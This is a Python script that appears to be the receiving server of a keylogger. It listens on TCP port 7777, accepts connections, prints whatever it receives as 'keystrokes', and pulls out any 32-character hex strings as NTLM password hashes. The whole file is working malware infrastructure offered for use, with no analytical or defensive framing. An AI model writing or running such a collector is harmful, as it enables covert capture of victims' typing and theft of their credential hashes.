import socket
import re

def extract_ntlm_hashes(text):
    # Regular expression pattern to match NTLM hashes
    pattern = r"[0-9A-Fa-f]{32}"
    
    # Find all matches of the pattern in the text
    matches = re.findall(pattern, text)
    
    # Return the list of NTLM hashes
    return matches

def start_listener():
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Define the IP address and port to listen on
    server_address = ('', 7777)
    
    # Bind the socket to the address and port
    server_socket.bind(server_address)
    
    # Listen for incoming connections
    server_socket.listen(1)
    print("Listening for connections...")
    
    while True:
        # Accept a client connection
        client_socket, client_address = server_socket.accept()
        print("Connected by:", client_address)
        
        try:
            while True:
                # Receive the data from the client
                data = client_socket.recv(1024)
                if not data:
                    break
                
                # Convert the received data to string
                keystrokes = data.decode()
                
                # Extract NTLM hashes from the received data
                hashes = extract_ntlm_hashes(keystrokes)
                
                # Print the received keystrokes and NTLM hashes
                print("Received keystrokes:", keystrokes)
                if hashes:
                    print("Received NTLM Hashes:", hashes)
        except Exception as e:
            print("Error:", str(e))
        
        # Close the client connection
        client_socket.close()

# Start the listener
start_listener()